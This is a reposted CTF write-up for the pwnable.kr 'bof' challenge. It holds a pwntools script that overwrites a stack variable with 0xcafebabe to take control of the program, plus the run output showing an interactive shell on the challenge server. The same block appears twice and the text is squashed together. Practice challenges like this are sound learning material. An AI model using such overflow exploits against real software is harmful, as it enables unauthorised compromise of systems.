# [pwnable.kr] bof 题解

> 原文: https://www.ctfiot.com/282222.html
> ID: 282222

[root@VM-24-14-opencloudos ~]# uname -aLinux VM-24-14-opencloudos6.6.47-12.oc9.x86_64#1 SMP PREEMPT_DYNAMIC Tue Sep 24 16:15:42 CST 2024 x86_64 x86_64 x86_64 GNU/Linux

frompwnimport*key = 0xcafebabebof =b'A'*13*4+ p32(key)print(bof)r = ssh('bof','pwnable.kr', password='guest', port=2222)p = r.process(executable='./bof', argv=['bof'])p.sendline(bof)p.interactive()

b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxbexbaxfexca'[x] Connecting to pwnable.kr on port2222[+] Connecting to pwnable.kr on port2222: Done[!] Couldn't check security settings on 'pwnable.kr'[x] Starting remote process './bof' on pwnable.kr[+] Starting remote process './bof' on pwnable.kr: pid 928856[!] ASLR is disabled for '/home/bof/bof'![*] Switching to interactive modeoverflow me : $ ls -altotal 48drwxr-x--- 2 root bof 4096 Jun 15 09:17 .drwxr-xr-x 118 root root 4096 Jun 1 12:05 ..-rw-r--r-- 1 root root 220 Feb 14 2025 .bash_logout-rw-r--r-- 1 root root 3771 Feb 14 2025 .bashrc-rwxr-xr-x 1 root bof 15300 Mar 26 2025 bof-rw-r--r-- 1 root root 342 Mar 26 2025 bof.c-rw------- 1 root root 46 Jun 15 09:17 .gdb_history-rw-r--r-- 1 root root 811 Apr 3 2025 .profile-rw-r--r-- 1 root root 86 Apr 3 2025 readme$


```
[root@VM-24-14-opencloudos ~]# uname -aLinux VM-24-14-opencloudos6.6.47-12.oc9.x86_64#1 SMP PREEMPT_DYNAMIC Tue Sep 24 16:15:42 CST 2024 x86_64 x86_64 x86_64 GNU/Linux
frompwnimport*key = 0xcafebabebof =b'A'*13*4+ p32(key)print(bof)r = ssh('bof','pwnable.kr', password='guest', port=2222)p = r.process(executable='./bof', argv=['bof'])p.sendline(bof)p.interactive()
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxbexbaxfexca'[x] Connecting to pwnable.kr on port2222[+] Connecting to pwnable.kr on port2222: Done[!] Couldn't check security settings on 'pwnable.kr'[x] Starting remote process './bof' on pwnable.kr[+] Starting remote process './bof' on pwnable.kr: pid 928856[!] ASLR is disabled for '/home/bof/bof'![*] Switching to interactive modeoverflow me : $ ls -altotal 48drwxr-x--- 2 root bof 4096 Jun 15 09:17 .drwxr-xr-x 118 root root 4096 Jun 1 12:05 ..-rw-r--r-- 1 root root 220 Feb 14 2025 .bash_logout-rw-r--r-- 1 root root 3771 Feb 14 2025 .bashrc-rwxr-xr-x 1 root bof 15300 Mar 26 2025 bof-rw-r--r-- 1 root root 342 Mar 26 2025 bof.c-rw------- 1 root root 46 Jun 15 09:17 .gdb_history-rw-r--r-- 1 root root 811 Apr 3 2025 .profile-rw-r--r-- 1 root root 86 Apr 3 2025 readme$
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763306164-wxsync-2025-11-ee29c6074a3897e4fc00c96a84f789c7.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763306169-wxsync-2025-11-fe3aa085bfddbae7a208fc4b54eb6b0b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763306173-wxsync-2025-11-4ff3db5d0023c3d9e23c9514c8da338f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763306176-wxsync-2025-11-00706dac9044ac8baf474e632dd27f77.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763306180-wxsync-2025-11-194748afebb3818ac5b18cd7e458963a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763306186-wxsync-2025-11-88f771c45abb0182bde03cc0cecda771.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763306190-wxsync-2025-11-3c51aac18d93d6fe54d60be007e271e2.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763306193-wxsync-2025-11-c3fddca0ce5194cf4c406a686f77cf91.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763306195-wxsync-2025-11-abcee41873692a3214db145782d35c98.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763306197-wxsync-2025-11-f2a33dd71a5a44bd2a3d26f5d014f554.png)